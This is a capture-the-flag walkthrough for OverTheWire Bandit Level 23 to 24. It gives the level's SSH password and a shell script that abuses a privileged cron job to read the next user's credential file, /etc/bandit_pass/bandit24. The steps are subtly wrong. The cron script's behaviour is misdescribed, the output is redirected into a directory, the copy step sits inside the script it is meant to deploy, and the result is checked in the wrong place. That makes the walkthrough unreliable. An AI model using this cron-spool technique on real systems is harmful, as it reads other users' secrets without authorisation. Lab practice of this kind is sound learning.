## Level 23 → Level 24

### Objective:
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

### Notes:
- This level requires you to create your own first shell script. This is a very big step, and you should be proud of yourself when you beat this level!
- Keep in mind that your shell script is removed once executed, so you may want to keep a copy around.

### SSH Credentials for Level 23:
- **Username**: `bandit23@bandit.labs.overthewire.org`
- **Password**: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga` (output from level 22)

### Steps:

1. List the contents of `/etc/cron.d/` to find the relevant cron job configuration:
    ```bash
    ls /etc/cron.d/
    ```

2. View the content of the `cronjob_bandit24` file to understand what command is being executed:
    ```bash
    cat /etc/cron.d/cronjob_bandit24
    ```

3. Identify the script that is being executed by the cron job:
    ```bash
    cat /usr/bin/cronjob_bandit24.sh
    ```
   - This script deletes all folders in `/var/spool/$myname/foo` (`/var/spool/bandit24/foo`) if the owner is `bandit23`, with a timeout of 60 seconds.

4. Create a temporary directory to store your password:
    ```bash
    mktemp -d
    ```
   - This will create a temporary directory (e.g., `/tmp/tmp.I6NAhFBL3f`).

5. Create your shell script:
    ```bash
    nano script.sh
    ```
   - Inside the script, write the following:
    ```bash
    #!/bin/bash
    cat /etc/bandit_pass/bandit24 > /tmp/tmp.I6NAhFBL3f
    touch password
    chmod 777 -R /tmp/tmp.I6NAhFBL3f
    cp script.sh /var/spool/bandit24/foo
    ```

6. Make your script executable:
    ```bash
    chmod +x script.sh
    ```

7. After waiting for 1 minute, check the `password` file to see the results:
    ```bash
    cat password
    ```

8. Use the `exit` command to exit `bandit23`:
    ```bash
    exit
    ```

---

### Happy Hacking!
